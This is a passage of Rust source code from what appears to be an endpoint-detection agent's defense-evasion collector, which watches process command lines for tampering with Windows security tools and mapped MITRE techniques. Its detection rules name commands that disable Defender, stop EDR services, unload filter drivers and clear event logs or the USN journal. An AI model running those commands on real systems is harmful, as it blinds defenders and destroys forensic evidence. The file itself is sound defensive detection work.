//! Defense Evasion Detection Collector
//!
//! Detects various defense evasion techniques including:
//! - Security tool tampering (AV/EDR/Sysmon)
//! - Timestomping detection
//! - Log evasion and clearing
//! - Indicator removal
//! - AMSI bypass detection (memory-level patching + command-line patterns)
//! - API unhooking and direct syscalls
//! - Virtualization/sandbox evasion
//! - ETW patching detection (ntdll function prologue tampering)
//! - Event Log tampering (service integrity, thread termination, .evtx deletion)
//! - Credential Guard bypass detection (lsaiso.exe, WDigest downgrade)
//!
//! MITRE ATT&CK Techniques:
//! - T1562 - Impair Defenses
//! - T1562.001 - Disable or Modify Tools (AMSI bypass)
//! - T1562.006 - Indicator Blocking (ETW patching)
//! - T1070 - Indicator Removal
//! - T1070.001 - Clear Windows Event Logs
//! - T1497 - Virtualization/Sandbox Evasion
//! - T1140 - Deobfuscate/Decode Files or Information
//! - T1036 - Masquerading
//! - T1003.001 - OS Credential Dumping: LSASS Memory (Credential Guard bypass)

use super::{Detection, DetectionType, EventPayload, EventType, Severity, TelemetryEvent};
use crate::config::AgentConfig;
use serde::{Deserialize, Serialize};
use std::collections::HashSet;
use tokio::sync::mpsc;
use tracing::{debug, error, info, warn};

/// Defense evasion event types
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum EvasionType {
    /// Security tool disabled or tampered
    SecurityToolTampering,
    /// Event log cleared
    EventLogClearing,
    /// ETW tampering detected
    EtwTampering,
    /// Sysmon removal/tampering
    SysmonTampering,
    /// EDR/Driver unload attempt
    DriverUnload,
    /// File timestamp manipulation
    Timestomping,
    /// PowerShell logging disabled
    PowerShellLoggingDisabled,
    /// Audit policy modified
    AuditPolicyModified,
    /// Firewall log disabled
    FirewallLogDisabled,
    /// Prefetch/artifact deletion
    ArtifactDeletion,
    /// USN journal deletion
    UsnJournalDeletion,
    /// MFT manipulation
    MftManipulation,
    /// Browser history clearing
    BrowserHistoryClearing,
    /// AMSI bypass detected
    AmsiBypass,
    /// API unhooking detected
    ApiUnhooking,
    /// Direct syscall detected
    DirectSyscall,
    /// VM detection attempt
    VmDetection,
    /// Sandbox evasion attempt
    SandboxEvasion,
    /// Analysis tool detection
    AnalysisToolDetection,
    /// Windows Defender exclusion
    DefenderExclusion,
    /// Credential Guard bypass attempt
    CredentialGuardBypass,
    /// Event Log service tampering (thread termination, .evtx deletion)
    EventLogServiceTamper,
    /// ETW provider unregistration for security-relevant providers
    EtwProviderUnregister,
    /// DLL sideloading detected (T1574.002)
    DllSideloading,
    /// LOLBin suspicious execution (T1218)
    LolbinExecution,
    /// Command line spoofing detected (T1564.010)
    /// Process modified its PEB->ProcessParameters->CommandLine after creation
    CommandLineSpoofing,
}

impl EvasionType {
    pub fn as_str(&self) -> &'static str {
        match self {
            Self::SecurityToolTampering => "security_tool_tampering",
            Self::EventLogClearing => "event_log_clearing",
            Self::EtwTampering => "etw_tampering",
            Self::SysmonTampering => "sysmon_tampering",
            Self::DriverUnload => "driver_unload",
            Self::Timestomping => "timestomping",
            Self::PowerShellLoggingDisabled => "powershell_logging_disabled",
            Self::AuditPolicyModified => "audit_policy_modified",
            Self::FirewallLogDisabled => "firewall_log_disabled",
            Self::ArtifactDeletion => "artifact_deletion",
            Self::UsnJournalDeletion => "usn_journal_deletion",
            Self::MftManipulation => "mft_manipulation",
            Self::BrowserHistoryClearing => "browser_history_clearing",
            Self::AmsiBypass => "amsi_bypass",
            Self::ApiUnhooking => "api_unhooking",
            Self::DirectSyscall => "direct_syscall",
            Self::VmDetection => "vm_detection",
            Self::SandboxEvasion => "sandbox_evasion",
            Self::AnalysisToolDetection => "analysis_tool_detection",
            Self::DefenderExclusion => "defender_exclusion",
            Self::CredentialGuardBypass => "credential_guard_bypass",
            Self::EventLogServiceTamper => "event_log_service_tamper",
            Self::EtwProviderUnregister => "etw_provider_unregister",
            Self::DllSideloading => "dll_sideloading",
            Self::LolbinExecution => "lolbin_execution",
            Self::CommandLineSpoofing => "command_line_spoofing",
        }
    }

    pub fn mitre_technique(&self) -> &'static str {
        match self {
            Self::SecurityToolTampering => "T1562.001",
            Self::EventLogClearing => "T1070.001",
            Self::EtwTampering => "T1562.006",
            Self::SysmonTampering => "T1562.001",
            Self::DriverUnload => "T1562.001",
            Self::Timestomping => "T1070.006",
            Self::PowerShellLoggingDisabled => "T1562.002",
            Self::AuditPolicyModified => "T1562.002",
            Self::FirewallLogDisabled => "T1562.004",
            Self::ArtifactDeletion => "T1070.004",
            Self::UsnJournalDeletion => "T1070",
            Self::MftManipulation => "T1070",
            Self::BrowserHistoryClearing => "T1070.003",
            Self::AmsiBypass => "T1562.001",
            Self::ApiUnhooking => "T1562.001",
            Self::DirectSyscall => "T1106",
            Self::VmDetection => "T1497.001",
            Self::SandboxEvasion => "T1497.002",
            Self::AnalysisToolDetection => "T1497.003",
            Self::DefenderExclusion => "T1562.001",
            Self::CredentialGuardBypass => "T1003.001",
            Self::EventLogServiceTamper => "T1070.001",
            Self::EtwProviderUnregister => "T1562.006",
            Self::DllSideloading => "T1574.002",
            Self::LolbinExecution => "T1218",
            Self::CommandLineSpoofing => "T1564.010",
        }
    }

    pub fn severity(&self) -> Severity {
        match self {
            Self::SecurityToolTampering => Severity::Critical,
            Self::EventLogClearing => Severity::High,
            Self::EtwTampering => Severity::Critical,
            Self::SysmonTampering => Severity::Critical,
            Self::DriverUnload => Severity::Critical,
            Self::Timestomping => Severity::High,
            Self::PowerShellLoggingDisabled => Severity::High,
            Self::AuditPolicyModified => Severity::High,
            Self::FirewallLogDisabled => Severity::Medium,
            Self::ArtifactDeletion => Severity::Medium,
            Self::UsnJournalDeletion => Severity::High,
            Self::MftManipulation => Severity::Critical,
            Self::BrowserHistoryClearing => Severity::Low,
            Self::AmsiBypass => Severity::Critical,
            Self::ApiUnhooking => Severity::Critical,
            Self::DirectSyscall => Severity::High,
            Self::VmDetection => Severity::Medium,
            Self::SandboxEvasion => Severity::Medium,
            // Informational only: analysis tools (gdb, wireshark, procexp, etc.)
            // are legitimate development and security tools. This detection should
            // not generate alerts; it is useful only as contextual telemetry.
            Self::AnalysisToolDetection => Severity::Low,
            Self::DefenderExclusion => Severity::High,
            Self::CredentialGuardBypass => Severity::Critical,
            Self::EventLogServiceTamper => Severity::Critical,
            Self::EtwProviderUnregister => Severity::High,
            Self::DllSideloading => Severity::High,
            Self::LolbinExecution => Severity::High,
            Self::CommandLineSpoofing => Severity::High,
        }
    }
}

/// Defense evasion event details
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DefenseEvasionEvent {
    /// Type of evasion detected
    pub evasion_type: EvasionType,
    /// Process ID responsible
    pub pid: u32,
    /// Process name
    pub process_name: String,
    /// Process path
    pub process_path: String,
    /// Process command line
    pub cmdline: String,
    /// User account
    pub user: String,
    /// Target of the evasion (e.g., service name, file path)
    pub target: String,
    /// Additional details
    pub details: String,
    /// Original value (if applicable)
    pub original_value: Option<String>,
    /// New value (if applicable)
    pub new_value: Option<String>,
}

/// Defense evasion collector
pub struct DefenseEvasionCollector {
    #[allow(dead_code)]
    config: AgentConfig,
    event_rx: mpsc::Receiver<TelemetryEvent>,
    #[allow(dead_code)]
    event_tx: mpsc::Sender<TelemetryEvent>,
}

impl DefenseEvasionCollector {
    /// Create a new defense evasion collector
    pub fn new(config: &AgentConfig) -> Self {
        let (tx, rx) = mpsc::channel(500);

        let collector = Self {
            config: config.clone(),
            event_rx: rx,
            event_tx: tx.clone(),
        };

        // Start platform-specific monitoring
        #[cfg(target_os = "windows")]
        {
            let tx_clone = tx.clone();
            let config_clone = config.clone();
            tokio::spawn(async move {
                Self::windows_monitor_loop(tx_clone, config_clone).await;
            });
        }

        #[cfg(target_os = "linux")]
        {
            let tx_clone = tx.clone();
            let config_clone = config.clone();
            tokio::spawn(async move {
                Self::linux_monitor_loop(tx_clone, config_clone).await;
            });
        }

        collector
    }

    /// Get next event from collector
    pub async fn next_event(&mut self) -> Option<TelemetryEvent> {
        self.event_rx.recv().await
    }

    /// Create telemetry event from defense evasion detection
    fn create_evasion_event(evasion: &DefenseEvasionEvent) -> TelemetryEvent {
        // Map evasion types to specific EventType variants for better
        // categorization in the backend detection pipeline
        let event_type = match evasion.evasion_type {
            EvasionType::EtwTampering | EvasionType::EtwProviderUnregister => EventType::ETWTamper,
            EvasionType::AmsiBypass => EventType::AMSIBypass,
            EvasionType::EventLogClearing | EvasionType::EventLogServiceTamper => {
                EventType::EventLogTamper
            }
            EvasionType::CredentialGuardBypass => EventType::CredGuardBypass,
            EvasionType::DllSideloading => EventType::DllSideload,
            EvasionType::LolbinExecution => EventType::LolbinExecution,
            _ => EventType::DefenseEvasion,
        };

        let mut event = TelemetryEvent::new(
            event_type,
            evasion.evasion_type.severity(),
            EventPayload::DefenseEvasion(evasion.clone()),
        );

        // Add detection
        let confidence = match evasion.evasion_type {
            // Analysis tools are legitimate; low confidence to avoid false positives
            EvasionType::AnalysisToolDetection => 0.4,
            // Memory-level tamper detections are very high confidence
            EvasionType::EtwTampering | EvasionType::AmsiBypass => 0.98,
            // Thread-kill and file deletion are high confidence
            EvasionType::EventLogServiceTamper => 0.95,
            // Registry/process-based detections
            EvasionType::CredentialGuardBypass => 0.92,
            _ => 0.90,
        };
        event.add_detection(Detection {
            detection_type: DetectionType::DefenseEvasion,
            rule_name: format!("defense_evasion_{}", evasion.evasion_type.as_str()),
            confidence,
            description: format!(
                "Defense evasion detected: {} - {} (Target: {})",
                evasion.evasion_type.as_str(),
                evasion.details,
                evasion.target
            ),
            mitre_tactics: {
                let mut tactics = vec!["defense-evasion".to_string()];
                // Some evasion types also map to additional MITRE tactics
                match evasion.evasion_type {
                    EvasionType::CredentialGuardBypass => {
                        tactics.push("credential-access".to_string());
                    }
                    EvasionType::EventLogClearing | EvasionType::EventLogServiceTamper => {
                        tactics.push("defense-evasion".to_string());
                    }
                    _ => {}
                }
                tactics
            },
            mitre_techniques: vec![evasion.evasion_type.mitre_technique().to_string()],
        });

        // Add metadata
        event.metadata.insert(
            "evasion_type".to_string(),
            evasion.evasion_type.as_str().to_string(),
        );
        event
            .metadata
            .insert("target".to_string(), evasion.target.clone());
        event
            .metadata
            .insert("details".to_string(), evasion.details.clone());

        if let Some(ref orig) = evasion.original_value {
            event
                .metadata
                .insert("original_value".to_string(), orig.clone());
        }
        if let Some(ref new_val) = evasion.new_value {
            event
                .metadata
                .insert("new_value".to_string(), new_val.clone());
        }

        event
    }

    // ==================== Windows Implementation ====================
    #[cfg(target_os = "windows")]
    async fn windows_monitor_loop(tx: mpsc::Sender<TelemetryEvent>, config: AgentConfig) {
        let mul = config.sub_loop_interval_multiplier;
        let full_scan = config.full_scan_features;
        info!(
            multiplier = mul,
            full_scan = full_scan,
            "Starting Windows defense evasion monitor"
        );

        // Start multiple monitoring tasks
        let tx1 = tx.clone();
        let tx2 = tx.clone();
        let tx3 = tx.clone();
        let tx4 = tx.clone();
        let tx5 = tx.clone();
        let tx6 = tx.clone();
        let tx8 = tx.clone();
        let tx9 = tx.clone();
        let tx10 = tx.clone();
        let tx12 = tx.clone();
        let tx13 = tx.clone();
        let tx14 = tx.clone();

        // Security tool tampering monitor (5s base -> scaled by multiplier)
        let security_interval_ms = ((5000.0 * mul) as u64).max(5000);
        tokio::spawn(async move {
            Self::monitor_security_tools(tx1, security_interval_ms).await;
        });

        // Event log clearing monitor (2s base -> scaled by multiplier)
        let evtlog_interval_ms = ((2000.0 * mul) as u64).max(2000);
        tokio::spawn(async move {
            Self::monitor_event_log_clearing(tx2, evtlog_interval_ms).await;
        });

        // Defender exclusions monitor (2s base -> scaled by multiplier)
        let defender_interval_ms = ((2000.0 * mul) as u64).max(2000);
        tokio::spawn(async move {
            Self::monitor_defender_exclusions(tx3, defender_interval_ms).await;
        });

        // Timestomping detection (10s base -> scaled by multiplier)
        let timestomp_interval_ms = ((10000.0 * mul) as u64).max(10000);
        tokio::spawn(async move {
            Self::monitor_timestomping(tx4, timestomp_interval_ms).await;
        });

        // AMSI bypass detection (2s base -> scaled by multiplier)
        let amsi_interval_ms = ((2000.0 * mul) as u64).max(2000);
        tokio::spawn(async move {
            Self::monitor_amsi_bypass(tx5, amsi_interval_ms).await;
        });

        // API unhooking detection (3s base -> scaled by multiplier)
        let unhook_interval_ms = ((3000.0 * mul) as u64).max(3000);
        tokio::spawn(async move {
            Self::monitor_api_unhooking(tx6, unhook_interval_ms).await;
        });

        // VM/Sandbox evasion detection (full_scan only)
        if full_scan {
            let tx7 = tx.clone();
            let vm_interval_ms = ((5000.0 * mul) as u64).max(5000);
            tokio::spawn(async move {
                Self::monitor_vm_sandbox_evasion(tx7, vm_interval_ms).await;
            });
        } else {
            info!("Skipping vm_sandbox_evasion monitor (full_scan_features=false)");
        }

        // ================================================================
        // EDR Blinding Detection - Deep Memory-Level Monitors
        // ================================================================

        // ETW patching detection (T1562.006): baselines and verifies
        // ntdll ETW function prologues (15s base -> scaled by multiplier)
        let etw_interval_ms = ((15000.0 * mul) as u64).max(15000);
        tokio::spawn(async move {
            Self::monitor_etw_patching(tx8, etw_interval_ms).await;
        });

        // AMSI memory patching detection (T1562.001): baselines amsi.dll
        // function prologues and checks across target processes (10s base)
        let amsi_mem_interval_ms = ((10000.0 * mul) as u64).max(10000);
        tokio::spawn(async move {
            Self::monitor_amsi_memory_patching(tx9, amsi_mem_interval_ms).await;
        });

        // Event Log service integrity monitor (T1070.001): checks service
        // threads, .evtx file integrity, and channel heartbeats (10s base)
        let evtlog_svc_interval_ms = ((10000.0 * mul) as u64).max(10000);
        tokio::spawn(async move {
            Self::monitor_event_log_service_integrity(tx10, evtlog_svc_interval_ms).await;
        });

        // Credential Guard bypass detection (full_scan only)
        if full_scan {
            let tx11 = tx.clone();
            let cg_interval_ms = ((10000.0 * mul) as u64).max(10000);
            tokio::spawn(async move {
                Self::monitor_credential_guard_bypass(tx11, cg_interval_ms).await;
            });
        } else {
            info!("Skipping credential_guard_bypass monitor (full_scan_features=false)");
        }

        // ================================================================
        // DLL Sideloading & LOLBin Detection
        // ================================================================

        // DLL sideloading detection (T1574.002) (15s base -> scaled by multiplier)
        let sideload_interval_ms = ((15000.0 * mul) as u64).max(15000);
        tokio::spawn(async move {
            Self::monitor_dll_sideloading(tx12, sideload_interval_ms).await;
        });

        // ================================================================
        // Direct Syscall Detection
        // ================================================================

        // Direct/indirect syscall detection (T1106) (10s base -> scaled by multiplier)
        let syscall_interval_ms = ((10000.0 * mul) as u64).max(10000);
        tokio::spawn(async move {
            Self::monitor_direct_syscalls(tx14, syscall_interval_ms).await;
        });

        // LOLBin behavioral baselining (T1218) (5s base -> scaled by multiplier)
        let lolbin_interval_ms = ((5000.0 * mul) as u64).max(5000);
        Self::monitor_lolbin_execution(tx13, lolbin_interval_ms).await;
    }

    #[cfg(target_os = "windows")]
    async fn monitor_security_tools(tx: mpsc::Sender<TelemetryEvent>, interval_ms: u64) {
        use sysinfo::System;

        info!("Starting security tool tampering monitor");

        // Security tool processes to monitor
        let security_processes: HashSet<&str> = [
            "MsMpEng.exe", // Windows Defender
            "MsSense.exe", // Microsoft Defender for Endpoint
            "SenseIR.exe", // Microsoft Defender IR
            "SenseCncProxy.exe",
            "MpCmdRun.exe", // Defender command line
            "NisSrv.exe",   // Network Inspection Service
            "SecurityHealthService.exe",
            "Sysmon.exe", // Sysmon
            "Sysmon64.exe",
            "cb.exe", // Carbon Black
            "CbDefense.exe",
            "CrowdStrike", // CrowdStrike
            "CSFalconService.exe",
            "SentinelAgent.exe", // SentinelOne
            "SentinelServiceHost.exe",
            "cyserver.exe", // Cylance
            "CylanceSvc.exe",
            "elastic-agent.exe", // Elastic
            "elastic-endpoint.exe",
            "winlogbeat.exe",
        ]
        .iter()
        .cloned()
        .collect();

        // Services to monitor
        let security_services = [
            "WinDefend", // Windows Defender
            "Sense",     // Microsoft Defender ATP
            "SecurityHealthService",
            "Sysmon",
            "Sysmon64",
            "CbDefense",
            "CSFalconService",
            "SentinelAgent",
            "CylanceSvc",
        ];

        let mut system = System::new_all();
        let mut known_security_pids: HashSet<u32> = HashSet::new();
        let mut interval = tokio::time::interval(tokio::time::Duration::from_millis(interval_ms));

        loop {
            interval.tick().await;

            system.refresh_processes();

            // Check for terminated security processes
            let current_security_pids: HashSet<u32> = system
                .processes()
                .iter()
                .filter(|(_, proc)| {
                    let name = proc.name().to_string();
                    security_processes
                        .iter()
                        .any(|sp| name.to_lowercase().contains(&sp.to_lowercase()))
                })
                .map(|(pid, _)| pid.as_u32())
                .collect();

            // Detect terminated security processes
            for pid in known_security_pids.difference(&current_security_pids) {
                let evasion = DefenseEvasionEvent {
                    evasion_type: EvasionType::SecurityToolTampering,
                    pid: 0,
                    process_name: "unknown".to_string(),
                    process_path: String::new(),
                    cmdline: String::new(),
                    user: String::new(),
                    target: format!("Security process PID {}", pid),
                    details: "Security tool process terminated unexpectedly".to_string(),
                    original_value: None,
                    new_value: None,
                };

                let event = Self::create_evasion_event(&evasion);
                if tx.send(event).await.is_err() {
                    warn!("Event channel closed");
                    return;
                }
            }

            known_security_pids = current_security_pids;

            // Check for processes attempting to kill security tools
            for (pid, process) in system.processes() {
                let cmdline = process.cmd().join(" ").to_lowercase();
                let name = process.name().to_lowercase();

                // Check for taskkill targeting security processes
                if name.contains("taskkill") || name.contains("tskill") || name.contains("pskill") {
                    for sp in &security_processes {
                        if cmdline.contains(&sp.to_lowercase()) {
                            let evasion = DefenseEvasionEvent {
                                evasion_type: EvasionType::SecurityToolTampering,
                                pid: pid.as_u32(),
                                process_name: process.name().to_string(),
                                process_path: process
                                    .exe()
                                    .map(|p| p.to_string_lossy().to_string())
                                    .unwrap_or_default(),
                                cmdline: cmdline.clone(),
                                user: String::new(),
                                target: sp.to_string(),
                                details: format!("Attempt to terminate security tool: {}", sp),
                                original_value: None,
                                new_value: None,
                            };

                            let event = Self::create_evasion_event(&evasion);
                            if tx.send(event).await.is_err() {
                                warn!("Event channel closed");
                                return;
                            }
                        }
                    }
                }

                // Check for sc.exe stopping/disabling security services
                if name.contains("sc.exe") || name.contains("sc") {
                    if cmdline.contains("stop")
                        || cmdline.contains("config") && cmdline.contains("disabled")
                    {
                        for svc in &security_services {
                            if cmdline.contains(&svc.to_lowercase()) {
                                let evasion = DefenseEvasionEvent {
                                    evasion_type: EvasionType::SecurityToolTampering,
                                    pid: pid.as_u32(),
                                    process_name: process.name().to_string(),
                                    process_path: process
                                        .exe()
                                        .map(|p| p.to_string_lossy().to_string())
                                        .unwrap_or_default(),
                                    cmdline: cmdline.clone(),
                                    user: String::new(),
                                    target: svc.to_string(),
                                    details: format!(
                                        "Attempt to stop/disable security service: {}",
                                        svc
                                    ),
                                    original_value: None,
                                    new_value: None,
                                };

                                let event = Self::create_evasion_event(&evasion);
                                if tx.send(event).await.is_err() {
                                    warn!("Event channel closed");
                                    return;
                                }
                            }
                        }
                    }
                }

                // Check for fltMC.exe unloading filter drivers
                if name.contains("fltmc") && cmdline.contains("unload") {
                    let evasion = DefenseEvasionEvent {
                        evasion_type: EvasionType::DriverUnload,
                        pid: pid.as_u32(),
                        process_name: process.name().to_string(),
                        process_path: process
                            .exe()
                            .map(|p| p.to_string_lossy().to_string())
                            .unwrap_or_default(),
                        cmdline: cmdline.clone(),
                        user: String::new(),
                        target: "Filter driver".to_string(),
                        details: "Attempt to unload filter driver (potential EDR bypass)"
                            .to_string(),
                        original_value: None,
                        new_value: None,
                    };

                    let event = Self::create_evasion_event(&evasion);
                    if tx.send(event).await.is_err() {
                        warn!("Event channel closed");
                        return;
                    }
                }
            }
        }
    }

    #[cfg(target_os = "windows")]
    async fn monitor_event_log_clearing(tx: mpsc::Sender<TelemetryEvent>, interval_ms: u64) {
        use sysinfo::System;

        info!("Starting event log clearing monitor");

        let mut system = System::new_all();
        let mut interval = tokio::time::interval(tokio::time::Duration::from_millis(interval_ms));

        loop {
            interval.tick().await;

            system.refresh_processes();

            for (pid, process) in system.processes() {
                let cmdline = process.cmd().join(" ").to_lowercase();
                let name = process.name().to_lowercase();

                // Check for wevtutil cl (clear log)
                if name.contains("wevtutil") && cmdline.contains("cl") {
                    let evasion = DefenseEvasionEvent {
                        evasion_type: EvasionType::EventLogClearing,
                        pid: pid.as_u32(),
                        process_name: process.name().to_string(),
                        process_path: process
                            .exe()
                            .map(|p| p.to_string_lossy().to_string())
                            .unwrap_or_default(),
                        cmdline: cmdline.clone(),
                        user: String::new(),
                        target: "Windows Event Log".to_string(),
                        details: "Event log clearing via wevtutil".to_string(),
                        original_value: None,
                        new_value: None,
                    };

                    let event = Self::create_evasion_event(&evasion);
                    if tx.send(event).await.is_err() {
                        return;
                    }
                }

                // Check for PowerShell Clear-EventLog
                if name.contains("powershell")
                    && (cmdline.contains("clear-eventlog") || cmdline.contains("clear-winevtlog"))
                {
                    let evasion = DefenseEvasionEvent {
                        evasion_type: EvasionType::EventLogClearing,
                        pid: pid.as_u32(),
                        process_name: process.name().to_string(),
                        process_path: process
                            .exe()
                            .map(|p| p.to_string_lossy().to_string())
                            .unwrap_or_default(),
                        cmdline: cmdline.clone(),
                        user: String::new(),
                        target: "Windows Event Log".to_string(),
                        details: "Event log clearing via PowerShell".to_string(),
                        original_value: None,
                        new_value: None,
                    };

                    let event = Self::create_evasion_event(&evasion);
                    if tx.send(event).await.is_err() {
                        return;
                    }
                }

                // Check for EventLog service stopping
                if name.contains("sc") && cmdline.contains("stop") && cmdline.contains("eventlog") {
                    let evasion = DefenseEvasionEvent {
                        evasion_type: EvasionType::EventLogClearing,
                        pid: pid.as_u32(),
                        process_name: process.name().to_string(),
                        process_path: process
                            .exe()
                            .map(|p| p.to_string_lossy().to_string())
                            .unwrap_or_default(),
                        cmdline: cmdline.clone(),
                        user: String::new(),
                        target: "EventLog Service".to_string(),
                        details: "Attempt to stop Windows Event Log service".to_string(),
                        original_value: None,
                        new_value: None,
                    };

                    let event = Self::create_evasion_event(&evasion);
                    if tx.send(event).await.is_err() {
                        return;
                    }
                }

                // Check for fsutil usn deletejournal
                if name.contains("fsutil")
                    && cmdline.contains("usn")
                    && cmdline.contains("deletejournal")
                {
                    let evasion = DefenseEvasionEvent {
                        evasion_type: EvasionType::UsnJournalDeletion,
                        pid: pid.as_u32(),
                        process_name: process.name().to_string(),
                        process_path: process
                            .exe()
                            .map(|p| p.to_string_lossy().to_string())
                            .unwrap_or_default(),
                        cmdline: cmdline.clone(),
                        user: String::new(),
                        target: "USN Journal".to_string(),
                        details: "USN journal deletion - indicator removal".to_string(),
                        original_value: None,
                        new_value: None,
                    };

                    let event = Self::create_evasion_event(&evasion);
                    if tx.send(event).await.is_err() {
                        return;
                    }
                }

                // Check for Prefetch deletion
                if (name.contains("cmd") || name.contains("powershell"))
                    && cmdline.contains("prefetch")
                    && (cmdline.contains("del")
                        || cmdline.contains("remove")
                        || cmdline.contains("rm"))
                {
                    let evasion = DefenseEvasionEvent {
                        evasion_type: EvasionType::ArtifactDeletion,
                        pid: pid.as_u32(),
                        process_name: process.name().to_string(),
                        process_path: process
                            .exe()
                            .map(|p| p.to_string_lossy().to_string())
                            .unwrap_or_default(),
                        cmdline: cmdline.clone(),
                        user: String::new(),
                        target: "Prefetch".to_string(),
                        details: "Prefetch file deletion - indicator removal".to_string(),
                        original_value: None,
                        new_value: None,
                    };

                    let event = Self::create_evasion_event(&evasion);
                    if tx.send(event).await.is_err() {
                        return;
                    }
                }

                // Check for audit policy modification
                if name.contains("auditpol")
                    && (cmdline.contains("/set") || cmdline.contains("/clear"))
                {
                    let evasion = DefenseEvasionEvent {
                        evasion_type: EvasionType::AuditPolicyModified,
                        pid: pid.as_u32(),
                        process_name: process.name().to_string(),
                        process_path: process
                            .exe()
                            .map(|p| p.to_string_lossy().to_string())
                            .unwrap_or_default(),
                        cmdline: cmdline.clone(),
                        user: String::new(),
                        target: "Audit Policy".to_string(),
                        details: "Audit policy modification detected".to_string(),
                        original_value: None,
                        new_value: None,
                    };

                    let event = Self::create_evasion_event(&evasion);
                    if tx.send(event).await.is_err() {
                        return;
                    }
                }
            }
        }
    }

    #[cfg(target_os = "windows")]
    async fn monitor_defender_exclusions(tx: mpsc::Sender<TelemetryEvent>, interval_ms: u64) {
        use sysinfo::System;

        info!("Starting Defender exclusion monitor");

        let mut system = System::new_all();
        let mut interval = tokio::time::interval(tokio::time::Duration::from_millis(interval_ms));

        // Track (pid, evasion_type) pairs already reported to avoid flooding with
        // duplicate events for the same long-running process.
        let mut reported_pids: HashSet<u32> = HashSet::new();

        loop {
            interval.tick().await;

            system.refresh_processes();

            // Prune reported_pids: remove PIDs no longer running
            reported_pids.retain(|pid| system.process(sysinfo::Pid::from_u32(*pid)).is_some());

            for (pid, process) in system.processes() {
                let pid_u32 = pid.as_u32();

                // Skip processes we've already reported
                if reported_pids.contains(&pid_u32) {
                    continue;
                }

                let cmdline = process.cmd().join(" ").to_lowercase();
                let name = process.name().to_lowercase();

                // Check for Add-MpPreference exclusions
                if name.contains("powershell") && cmdline.contains("add-mppreference") {
                    if cmdline.contains("-exclusionpath")
                        || cmdline.contains("-exclusionprocess")
                        || cmdline.contains("-exclusionextension")
                    {
                        let evasion = DefenseEvasionEvent {
                            evasion_type: EvasionType::DefenderExclusion,
                            pid: pid.as_u32(),
                            process_name: process.name().to_string(),
                            process_path: process
                                .exe()
                                .map(|p| p.to_string_lossy().to_string())
                                .unwrap_or_default(),
                            cmdline: cmdline.clone(),
                            user: String::new(),
                            target: "Windows Defender".to_string(),
                            details: "Defender exclusion added via PowerShell".to_string(),
                            original_value: None,
                            new_value: None,
                        };

                        let event = Self::create_evasion_event(&evasion);
                        reported_pids.insert(pid_u32);
                        if tx.send(event).await.is_err() {
                            return;
                        }
                        continue; // One event per PID per cycle
                    }
                }

                // Check for Set-MpPreference disabling features
                if name.contains("powershell") && cmdline.contains("set-mppreference") {
                    if cmdline.contains("-disablerealtimemonitoring")
                        || cmdline.contains("-disablebehaviormonitoring")
                        || cmdline.contains("-disablescriptscanning")
                        || cmdline.contains("-disableioavprotection")
                        || cmdline.contains("-disableintrusionpreventionsystem")
                    {
                        let evasion = DefenseEvasionEvent {
                            evasion_type: EvasionType::SecurityToolTampering,
                            pid: pid.as_u32(),
                            process_name: process.name().to_string(),
                            process_path: process
                                .exe()
                                .map(|p| p.to_string_lossy().to_string())
                                .unwrap_or_default(),
                            cmdline: cmdline.clone(),
                            user: String::new(),
                            target: "Windows Defender".to_string(),
                            details: "Defender protection disabled via PowerShell".to_string(),
                            original_value: None,
                            new_value: None,
                        };

                        let event = Self::create_evasion_event(&evasion);
                        reported_pids.insert(pid_u32);
                        if tx.send(event).await.is_err() {
                            return;
                        }
                        continue;
                    }
                }

                // Check for reg.exe modifying Defender settings
                if name.contains("reg") && cmdline.contains("windows defender") {
                    if cmdline.contains("disableantispyware")
                        || cmdline.contains("disablerealtimemonitoring")
                    {
                        let evasion = DefenseEvasionEvent {
                            evasion_type: EvasionType::SecurityToolTampering,
                            pid: pid.as_u32(),
                            process_name: process.name().to_string(),
                            process_path: process
                                .exe()
                                .map(|p| p.to_string_lossy().to_string())
                                .unwrap_or_default(),
                            cmdline: cmdline.clone(),
                            user: String::new(),
                            target: "Windows Defender Registry".to_string(),
                            details: "Defender settings modified via registry".to_string(),
                            original_value: None,
                            new_value: None,
                        };

                        let event = Self::create_evasion_event(&evasion);
                        reported_pids.insert(pid_u32);
                        if tx.send(event).await.is_err() {
                            return;
                        }
                        continue;
                    }
                }

                // Check for PowerShell script block logging disabled
                if name.contains("powershell") || name.contains("reg") {
                    if cmdline.contains("scriptblocklogging")
                        || cmdline.contains("enablescriptblocklogging")
                    {
                        let evasion = DefenseEvasionEvent {
                            evasion_type: EvasionType::PowerShellLoggingDisabled,
                            pid: pid.as_u32(),
                            process_name: process.name().to_string(),
                            process_path: process
                                .exe()
                                .map(|p| p.to_string_lossy().to_string())
                                .unwrap_or_default(),
                            cmdline: cmdline.clone(),
                            user: String::new(),
                            target: "PowerShell ScriptBlock Logging".to_string(),
                            details: "PowerShell logging configuration modified".to_string(),
                            original_value: None,
                            new_value: None,
                        };

                        let event = Self::create_evasion_event(&evasion);
                        reported_pids.insert(pid_u32);
                        if tx.send(event).await.is_err() {
                            return;
                        }
                    }
                }
            }
        }
    }

    #[cfg(target_os = "windows")]
    async fn monitor_timestomping(tx: mpsc::Sender<TelemetryEvent>, interval_ms: u64) {
        use std::collections::HashMap;
        use std::fs;
        use std::time::SystemTime;

        info!("Starting timestomping detection monitor");

        // Track file timestamps for comparison
        let mut file_times: HashMap<String, (SystemTime, SystemTime, SystemTime)> = HashMap::new();
        let watch_paths = vec!["C:\\Windows\\Temp", "C:\\Users\\Public", "C:\\ProgramData"];

        let mut interval = tokio::time::interval(tokio::time::Duration::from_millis(interval_ms));

        loop {
            interval.tick().await;

            for base_path in &watch_paths {
                if let Ok(entries) = fs::read_dir(base_path) {
                    for entry in entries.flatten() {
                        let path = entry.path();
                        if !path.is_file() {
                            continue;
                        }

                        let path_str = path.to_string_lossy().to_string();

                        if let Ok(metadata) = fs::metadata(&path) {
                            let created = metadata.created().unwrap_or(SystemTime::UNIX_EPOCH);
                            let modified = metadata.modified().unwrap_or(SystemTime::UNIX_EPOCH);
                            let accessed = metadata.accessed().unwrap_or(SystemTime::UNIX_EPOCH);

                            // Check for anomalies
                            // 1. Modified time before created time
                            if modified < created {
                                let evasion = DefenseEvasionEvent {
                                    evasion_type: EvasionType::Timestomping,
                                    pid: 0,
                                    process_name: "unknown".to_string(),
                                    process_path: String::new(),
                                    cmdline: String::new(),
                                    user: String::new(),
                                    target: path_str.clone(),
                                    details:
                                        "Modified time before created time - possible timestomping"
                                            .to_string(),
                                    original_value: None,
